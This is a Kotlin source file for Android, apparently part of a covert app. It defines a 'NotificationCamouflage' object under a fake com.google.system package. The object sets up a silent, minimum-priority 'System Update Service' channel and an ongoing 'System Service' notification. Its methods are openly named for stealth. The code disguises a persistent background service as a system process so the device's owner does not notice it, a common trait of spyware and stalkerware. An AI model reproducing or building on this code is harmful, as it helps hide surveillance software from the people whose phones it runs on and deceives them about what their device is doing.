package com.google.system

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.core.app.NotificationCompat

object NotificationCamouflage {
    
    private const val CHANNEL_ID = "system_update_service"
    private const val CHANNEL_NAME = "System Update Service"
    private const val CHANNEL_DESC = "Checking for system updates"
    
    fun createStealthChannel(context: Context) {
        try {
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channel = NotificationChannel(
                CHANNEL_ID,
                CHANNEL_NAME,
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = CHANNEL_DESC
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    setAllowBubbles(false)
                }
            }
            notificationManager.createNotificationChannel(channel)
        } catch (_: Exception) {}
    }
    
    fun createStealthNotification(context: Context, text: String = "System services running"): Notification {
        return NotificationCompat.Builder(context, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_rotate)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .build()
    }
    
    fun getChannelId(): String = CHANNEL_ID
}
